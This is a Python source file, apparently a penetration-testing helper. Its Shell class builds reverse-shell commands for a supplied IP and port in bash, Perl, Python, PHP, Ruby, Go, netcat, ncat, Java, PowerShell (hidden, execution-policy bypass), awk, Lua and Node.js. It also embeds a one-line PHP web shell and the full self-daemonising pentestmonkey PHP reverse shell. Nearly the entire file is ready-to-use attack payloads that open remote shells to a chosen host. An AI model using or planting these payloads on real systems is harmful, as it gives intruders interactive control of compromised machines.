class Shell(object):
    def __init__(self, ip: str, port: int):
        self.IP = ip
        self.PORT = port

    def bash(self):
        rev_shells = [
            f"bash -i >& /dev/tcp/{self.IP}/{self.PORT} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{self.IP}/{self.PORT}; sh <&196 >&196 2>&196",
            f"/bin/bash -l > /dev/tcp/{self.IP}/{self.PORT} 0<&1 2>&1"
        ]
        return rev_shells

    def perl(self):
        rev_shells = [
            """perl -e 'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (self.IP, self.PORT),
            f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.IP}:{self.PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
        ]
        return rev_shells

    def python(self):
        rev_shells = [
            f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.IP}",{self.PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        ]
        return rev_shells

    def php(self):
        rev_shells = [
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});`/bin/sh -i <&3 >&3 2>&3`;'""",
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});system("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'""",
            f"""php -r '$sock=fsockopen("{self.IP}",{self.PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'"""
        ]
        return rev_shells

    def ruby(self):
        rev_shells = [
            f"""ruby -rsocket -e'f=TCPSocket.open("{self.IP}",{self.PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
            """ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%d");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""" % (self.IP, self.PORT)
        ]
        return rev_shells

    def golang(self):
        rev_shells = [
            """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%d");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""" % (self.IP, self.PORT)
        ]
        return rev_shells

    def netcat(self):
        rev_shells = [
            f"""nc -e /bin/sh {self.IP} {self.PORT}""",
            f"""nc -e /bin/bash {self.IP} {self.PORT}""",
            f"""nc -c bash {self.IP} {self.PORT}""",
            f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.IP} {self.PORT} >/tmp/f"""
        ]
        return rev_shells

    def ncat(self):
        rev_shells = [
            f"""ncat {self.IP} {self.PORT} -e /bin/bash""",
            f"""ncat --udp {self.IP} {self.PORT} -e /bin/bash"""
        ]
        return rev_shells

    def java(self):
        rev_shells = [
            f"""
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.IP}/{self.PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
            """.strip(),
            """
String host="%s";
int port=%d;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
            """.strip() % (self.IP, self.PORT)
        ]
        return rev_shells

    def powershell(self):
        rev_shells = [
            """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""".format(ip=self.IP, port=self.PORT),
            """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""".format(ip=self.IP, port=self.PORT)
        ]
        return rev_shells

    def awk(self):
        rev_shells = [
            """awk 'BEGIN {s = "/inet/tcp/0/%s/%d"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null""" % (self.IP, self.PORT)
        ]
        return rev_shells

    def lua(self):
        rev_shells = [
            f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{self.IP}','{self.PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');""",
            f"""lua5.1 -e 'local host, port = "{self.IP}", {self.PORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'"""
        ]
        return rev_shells

    def nodejs(self):
        rev_shells = [
            f"""require('child_process').exec('nc -e /bin/sh {self.IP} {self.PORT}')"""
        ]
        return rev_shells

    def tiny_php_shell_file(self):
        rev_shell = f"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{self.IP}/{self.PORT} 0>&1'");?>"""
        return [rev_shell]

    def php_reverse_shell_file(self):
        rev_shell = """
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '%s';  // CHANGE THIS
$port = %d;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    if ($pid) {
        exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process's STDIN
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // If we can read from the process's STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // If we can read from the process's STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
    if (!$daemon) {
        print "$string\\n";
    }
}

?>
        """.strip() % (self.IP, self.PORT)
        return [rev_shell]
